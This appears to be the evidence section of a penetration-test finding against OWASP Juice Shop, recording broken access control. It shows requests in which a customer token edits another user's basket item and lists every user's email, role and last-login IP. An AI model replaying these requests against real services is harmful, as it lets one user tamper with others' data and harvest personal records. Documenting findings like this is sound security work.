finding.evidence:
PUT /api/BasketItems/1 with Authorization: Bearer <customer i35test JWT>, body {"quantity":3} -> 200 {"status":"success","data":{"ProductId":1,"BasketId":1,"id":1,"quantity":3,...}}
GET /api/BasketItems/?BasketId=1 with same token -> 200 shows {"id":1,"BasketId":1,"quantity":3} (state changed on another user's item).
PUT /api/BasketItems/1 body {"quantity":2} -> 200 quantity:2 (restored original value). Item 1 belongs to basket 1 / UserId 1; attacker account is UserId 31.

GET /api/Users with customer JWT -> 200 8565 bytes {"status":"success","data":[{"id":1,"email":"admin@juice-sh.op","role":"admin",...},{"id":2,"email":"jim@juice-sh.op","role":"customer",...},...]}
GET /api/Users/1 with same customer JWT -> 200 {"status":"success","data":{"id":1,"email":"admin@juice-sh.op","role":"admin",...}}
GET /api/Users/2 -> 200 jim@juice-sh.op. GET /rest/user/authentication-details with customer JWT -> 200 11129 bytes, data array of all users with role, lastLoginIp, lastLoginTime (password field masked as "****").
Controls: GET /api/Users and GET /rest/user/authentication-details with NO Authorization header -> 401 UnauthorizedError.

